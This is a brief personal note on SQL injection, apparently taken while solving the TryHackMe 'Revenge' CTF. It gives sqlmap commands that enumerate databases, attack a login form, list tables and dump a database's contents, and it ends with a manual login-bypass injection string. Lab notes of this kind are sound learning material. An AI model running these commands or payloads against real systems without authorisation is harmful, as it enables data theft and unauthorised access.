# Automated SQLi using sqlmap
first enumerate the databases:
for this to happen we should find the url which contains any parameters. sqlmap needs these parameters so that it can inject SQLis into it. even i parameters are not found, find any directory whose subdirectories are in a predictible manner

in the CTF by THM named Revenge, i found such a directory named /products. the page was getting refreshed when the subdirectory was changed from /products/ to /products/1 and so on.

`in this manner, the databases of the website were enumerated`

```bash
sqlmap -u http://<target_ip>/products/1 --dbs
```

`if the target is a login page which does not reveal the parameters in the URL, then use this:`

```bash
sqlmap -u http://<target_ip>/login.php --data="username=admin&password=password" \
--level=3 \
--risk=2 \
--batch
```

`here you can find the existing tables of the databases. `

```bash
sqlmap -u http://<target_ip>/products/1 --batch -D <database_name> --tables
```

`
by simply swapping the --tables flag with the --dump flag, the contents of those tables would be dumped`

```bash
sqlmap -u http://<target_ip>/products/1 --batch -D duckyinc --dump
```

# Manual SQLi checks:

```bash
' OR '1'='1'--
```
